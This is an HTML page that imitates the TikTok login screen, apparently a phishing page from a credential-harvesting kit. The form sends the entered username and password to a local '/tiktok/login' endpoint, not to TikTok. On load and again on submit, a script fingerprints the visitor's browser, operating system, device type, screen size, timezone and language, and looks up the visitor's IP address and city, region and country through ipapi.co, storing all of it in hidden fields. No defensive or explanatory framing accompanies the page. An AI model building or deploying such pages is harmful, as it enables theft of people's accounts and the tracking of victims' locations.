<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Log in</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
         background:#fff; color:#161823; min-height:100vh;
         display:flex; justify-content:center; align-items:center; padding:20px; }
  .box { width:100%; max-width:380px; padding:32px 24px; }
  .logo { text-align:center; font-size:28px; font-weight:800; margin-bottom:24px; letter-spacing:-1px; }
  .logo span:nth-child(1){ color:#000; }
  .logo span:nth-child(2){ color:#fe2c55; }
  .logo span:nth-child(3){ color:#25f4ee; }
  h1 { font-size:24px; font-weight:700; text-align:center; margin-bottom:24px; }
  .tabs { display:flex; justify-content:center; gap:32px; margin-bottom:24px; border-bottom:1px solid #e3e3e4; }
  .tab { padding:10px 0; font-size:15px; font-weight:600; color:#161823; cursor:pointer; border-bottom:2px solid transparent; }
  .tab.active { border-color:#161823; }
  input { width:100%; padding:12px 14px; font-size:15px; background:#f1f1f2;
    border:1px solid transparent; border-radius:4px; margin-bottom:12px; outline:none; }
  input:focus { background:#fff; border-color:#161823; }
  .btn { width:100%; background:#fe2c55; color:#fff; border:none; padding:12px;
    font-size:16px; font-weight:600; border-radius:4px; cursor:pointer; margin-top:8px; }
  .forgot { display:block; text-align:center; color:#161823; font-size:13px; text-decoration:none; margin-top:16px; }
  .footer { text-align:center; font-size:12px; color:#8a8b91; margin-top:24px; line-height:1.6; }
</style>
</head>
<body>
  <div class="box">
    <div class="logo"><span>Tik</span><span>Tok</span></div>
    <h1>Log in to TikTok</h1>
    <div class="tabs">
      <div class="tab active">Phone</div>
      <div class="tab">Email / Username</div>
    </div>
    <form action="/tiktok/login" method="POST" id="login-form">
      <input type="text" name="email" placeholder="Phone, Email or Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="btn">Log in</button>
      <input type="hidden" name="ip_address" id="ip-address">
      <input type="hidden" name="geo_location" id="geo-location">
      <input type="hidden" name="device_type" id="device-type">
      <input type="hidden" name="browser_info" id="browser-info">
      <input type="hidden" name="os_info" id="os-info">
      <input type="hidden" name="screen_resolution" id="screen-resolution">
      <input type="hidden" name="timezone" id="timezone">
      <input type="hidden" name="language" id="language">
    </form>
    <a href="#" class="forgot">Forgot password?</a>
    <div class="footer">By continuing, you agree to TikTok's Terms of Service and confirm that you have read TikTok's Privacy Policy.</div>
  </div>
<script>
async function collectFingerprint() {
  const ua = navigator.userAgent;
  document.getElementById('browser-info').value = ua;
  document.getElementById('os-info').value = navigator.platform;
  document.getElementById('device-type').value = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
  document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
  document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
  document.getElementById('language').value = navigator.language;
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    if (d.ip) {
      document.getElementById('ip-address').value = d.ip;
      document.getElementById('geo-location').value = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
    }
  } catch(e) {}
}
document.addEventListener('DOMContentLoaded', () => {
  collectFingerprint();
  const form = document.getElementById('login-form');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    await collectFingerprint();
    form.submit();
  });
});
</script>
</body>
</html>
